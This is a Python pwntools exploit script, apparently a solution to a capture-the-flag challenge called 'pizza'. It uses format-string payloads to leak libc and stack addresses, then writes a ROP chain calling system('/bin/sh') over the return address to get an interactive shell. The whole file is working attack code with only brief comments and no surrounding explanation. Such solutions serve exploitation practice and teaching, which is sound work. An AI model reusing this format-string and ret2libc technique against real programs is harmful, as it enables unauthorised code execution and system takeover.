#!/usr/bin/env python3

from pwn import *

exe = ELF("./pizza_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

if args.LOCAL:
    #r = gdb.debug([exe.path])
    r = process([exe.path])
    #if args.GDB:
        #gdb.attach(r)
else:
    r = remote("localhost", 5000)

def send_payload(payload):    
    
    # Inject Payload 
    r.sendlineafter(b'> ', b'12')
    r.sendlineafter(b'Enter custom topping: ', payload)

    # Reset program loop
    for j in range(2):
        r.sendlineafter(b'> ', b'12')
        r.sendlineafter(b'Enter custom topping: ', b'A')
    r.sendlineafter(b'(y/n): ', b'y')


def main():
    
    # Injecting Payload to leak libc base address
    r.sendlineafter(b'> ', b'12')
    r.sendlineafter(b'Enter custom topping: ', b'%47$p|||aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaa')

    # Injecting Payload to leak address on stack to write to
    # Injected twice because input is read thrice in one program loop
    for i in range(2):
        r.sendlineafter(b'> ', b'12')
        r.sendlineafter(b'Enter custom topping: ', b'%48$p|||aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaa')
            
    # Reading leak to calculate libc base address
    # __libc_start_main-0x36 is where main returns to
    r.recvuntil(b'that you chose:\n')
    libc_start_main_addr = bytes.fromhex(r.recvline().strip().split(b'|')[0].decode()[2:])[::-1].ljust(8,b'\x00')
    libc_base_addr = u64(libc_start_main_addr) + 0x36 - libc.symbols.__libc_start_main
    libc.address = libc_base_addr
    
    # Reading leak of stack address which retaddr resides
    # Read twice, coresponds to the number of inputs relating to payload injection for this leak
    for i in range(2):
        write_addr = bytes.fromhex(r.recvline().strip().split(b'|')[0].decode()[2:])[::-1].ljust(8,b'\x00')
        write_addr = u64(write_addr) - 0xf8

    log.info(f"{hex(libc.address)=}")
    log.info(f"{hex(write_addr)=}")

    # Construct the ROP chain
    rop = ROP(libc)
    rop.raw(rop.find_gadget(["ret"])[0])
    rop.system(next(libc.search(b"/bin/sh\x00")))
    log.info(rop.dump())

    # Reset program
    r.sendlineafter(b'(y/n): ', b'y')

    # Inject payload
    rop_chain = rop.chain()
    for i in range(len(rop_chain)//8): 
        payload = fmtstr_payload(6, {write_addr + i*8: u64(rop_chain[i*8:(i+1)*8])}, write_size='short')
        send_payload(payload)

    # AUTOMATION WITH THE FMTSTR OBJECT DOES NOT ALLOW FOR GRANULARITY CUSTOMIZATION
    # fmtstr = FmtStr(execute_fmt=send_payload, offset=6)
    # for i in range(len(rop_chain)//8):
        # fmtstr.write(write_addr + i*8, u64(rop_chain[i*8:(i+1)*8]))
        # fmtstr.execute_writes()

    # Run through program one last time and make it return and hit our ROP chain
    for i in range(3):
        r.sendlineafter(b'> ', b'12')
        r.sendlineafter(b'Enter custom topping: ', b'A')
    r.sendlineafter(b'(y/n): ', b'n')

    r.interactive()


if __name__ == "__main__":
    main()